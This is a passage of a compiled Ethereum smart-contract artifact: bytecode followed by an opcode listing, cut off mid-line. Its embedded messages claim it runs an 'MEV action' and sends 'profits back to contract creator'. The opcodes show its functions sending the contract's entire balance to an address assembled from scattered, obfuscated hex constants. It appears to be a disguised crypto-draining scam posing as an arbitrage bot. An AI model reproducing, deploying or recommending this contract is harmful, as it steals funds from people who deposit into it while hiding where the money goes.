181106105bc57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561060d575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561061d576057830392506106b7565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065b575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066b576037830392506106b6565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106a9575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b5576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f5575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156107055760578203915061079f565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610743575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107535760378203915061079e565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610791575060398273ffffffffffffffffffffffffffffffffffffffff1611155b1561079d576030820391505b5b5b8160108402018401935060028101905061057e565b5082945050505050919050565b6000630b9f1a09905090565b60606000808390505b600081146107f8578180600101925050601081816107f057fe5b0490506107d6565b60608267ffffffffffffffff8111801561081157600080fd5b506040519080825280601f01601f1916602001820160405280156108445781602001600182028036833780820191505090505b50905060005b838110156108c0576010868161085c57fe5b06925061086883610a3d565b826001838703038151811061087957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108b257fe5b04955080600101905061084a565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108f457600080fd5b506040519080825280601f01601f1916602001820160405280156109275781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109a55785828151811061094c57fe5b602001015160f81c60f81b83828060010193508151811061096957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610937565b600091505b8451821015610a18578482815181106109bf57fe5b602001015160f81c60f81b8382806001019350815181106109dc57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109aa565b82965050505050505092915050565b600062299978905090565b6000620cd4b5905090565b60008160ff16600011158015610a57575060098260ff1611155b15610a8c57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610ae1565b8160ff16600a11158015610aa45750600f8260ff1611155b15610adc57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610ae1565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xE2C CODESIZE SUB DUP1 PUSH3 0xE2C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x295 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x291 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x277 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xB87 DUP1 PUSH3 0x2A5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7D53D433 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0xE9 JUMPI DUP1 PUSH4 0xE1812F05 EQ PUSH2 0xF3 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE7 PUSH2 0x221 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xF1 PUSH2 0x2BC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x108 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x148 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x12D JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x175 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB1A PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x274 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2B9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xAE7 PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x30F PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x354 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x3ED JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x3C2 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x3ED JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x3D0 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7C1 JUMP JUMPDEST PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x93FC1E SWAP1 POP PUSH1 0x0 PUSH5 0xF676E9A32 SWAP1 POP PUSH1 0x0 PUSH4 0x5BBEAB1 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xA27 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4A7 PUSH2 0xA32 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4BD DUP8 PUSH2 0x4B8 DUP9 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4DB PUSH2 0x4CD DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x4D6 DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4E8 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4F5 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x515 PUSH2 0x506 DUP7 DUP7 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x510 DUP6 DUP6 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x558 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7B4 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x59A JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5BC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x60D JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x61D JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6B7 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66B JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6B6 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6A9 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B5 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F5 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x705 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x79F JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x743 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x753 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x79E JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x791 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x79D JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x57E JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xB9F1A09 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x7F8 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x7F0 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x811 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x844 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8C0 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x85C JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x868 DUP4 PUSH2 0xA3D JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x879 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8B2 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x84A JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x8F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x927 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x9A5 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x94C JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x969 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x937 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA18 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9BF JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9DC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9AA JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x299978 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCD4B5 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xA57 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA8C JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xAA4 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xADC JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 